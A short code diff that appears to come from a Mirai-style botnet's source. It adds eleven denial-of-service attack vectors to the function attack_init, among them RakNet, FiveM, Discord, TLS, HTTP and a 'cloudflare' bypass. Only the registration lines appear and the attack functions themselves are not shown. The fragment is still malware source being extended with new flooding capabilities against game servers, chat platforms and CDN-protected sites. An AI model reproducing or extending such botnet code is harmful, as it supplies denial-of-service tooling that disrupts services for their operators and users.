@@ -34,6 +34,17 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);
     add_attack(ATK_VEC_UDP_BYPASS, (ATTACK_FUNC)attack_udp_bypass);
     add_attack(ATK_VEC_STD, (ATTACK_FUNC)attack_std);
+    add_attack(ATK_VEC_RAKNET, (ATTACK_FUNC)attack_raknet);
+    add_attack(ATK_VEC_ESP, (ATTACK_FUNC)attack_esp);
+    add_attack(ATK_VEC_UDPHEX, (ATTACK_FUNC)attack_udp_hex);
+    add_attack(ATK_VEC_FIVEM, (ATTACK_FUNC)attack_fivem);
+    add_attack(ATK_VEC_DISCORD, (ATTACK_FUNC)attack_discord);
+    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_http);
+    add_attack(ATK_VEC_PPS, (ATTACK_FUNC)attack_pps);
+    add_attack(ATK_VEC_TLS, (ATTACK_FUNC)attack_tls);
+    add_attack(ATK_VEC_TLSPLUS, (ATTACK_FUNC)attack_tlsplus);
+    add_attack(ATK_VEC_CLOUDFLARE, (ATTACK_FUNC)attack_cloudflare);
+    add_attack(ATK_VEC_NERV_L7, (ATTACK_FUNC)attack_nerv_l7);
     return TRUE;
 }
 
